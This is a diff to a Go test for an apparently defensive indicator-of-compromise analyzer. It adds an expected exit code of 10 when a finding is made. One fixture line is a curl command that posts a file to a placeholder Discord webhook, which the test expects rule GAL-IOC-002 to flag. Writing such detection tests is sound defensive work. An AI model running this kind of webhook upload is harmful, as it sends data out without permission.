@@ -24,6 +24,7 @@ func TestAgentAnalyzeIOC(t *testing.T) {
 		// inputs
 		content string
 		// expectations
+		wantCode int      // agent exit code
 		wantRule string   // rule that must be present at notes.txt:wantLine; empty means no findings at all
 		wantLine int      // line of the finding
 		wantIOCs []string // "type value line"
@@ -31,6 +32,7 @@ func TestAgentAnalyzeIOC(t *testing.T) {
 		{
 			name:     "discord webhook on line 2",
 			content:  "build notes\ncurl -d @msg https://discord.com/api/webhooks/123/token\n",
+			wantCode: 10,
 			wantRule: "GAL-IOC-002",
 			wantLine: 2,
 			wantIOCs: []string{"url https://discord.com/api/webhooks/123/token 2", "domain discord.com 2"},
@@ -55,8 +57,8 @@ func TestAgentAnalyzeIOC(t *testing.T) {
 			out := filepath.Join(t.TempDir(), "out")
 			// When the agent analyzes it
 			stdout, stderr, code := runAgent(t, "analyze", "-o", out, filepath.Join(dir, "notes.txt"))
-			if code != 0 {
-				t.Fatalf("analyze exit = %d, want 0\nstdout: %s\nstderr: %s", code, stdout, stderr)
+			if code != tt.wantCode {
+				t.Fatalf("analyze exit = %d, want %d\nstdout: %s\nstderr: %s", code, tt.wantCode, stdout, stderr)
 			}
 			b, err := os.ReadFile(filepath.Join(out, "report.json"))
 			if err != nil {
